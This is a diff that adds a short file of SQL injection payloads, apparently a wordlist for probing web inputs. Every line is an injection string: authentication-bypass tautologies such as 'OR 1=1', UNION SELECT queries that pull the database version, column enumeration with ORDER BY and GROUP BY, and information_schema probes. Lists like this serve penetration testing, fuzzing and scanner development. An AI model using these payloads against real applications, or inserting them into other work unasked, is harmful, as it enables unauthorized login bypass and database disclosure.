@@ -1,0 +1,15 @@
+' OR 1=1 --
+' UNION SELECT null, null --
+' AND 1=1 --
+' HAVING 1=1 --
+' ORDER BY 1 --
+' GROUP BY 1 --
+' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --
+' AND EXISTS (SELECT 1 FROM dual) --
+' UNION SELECT 1, @@version --
+' OR 'admin'='admin' --
+' OR 1=1 --
+' OR 'a'='a
+' UNION SELECT null, @@version --
+' AND 1=2 --
+' OR '1'='1
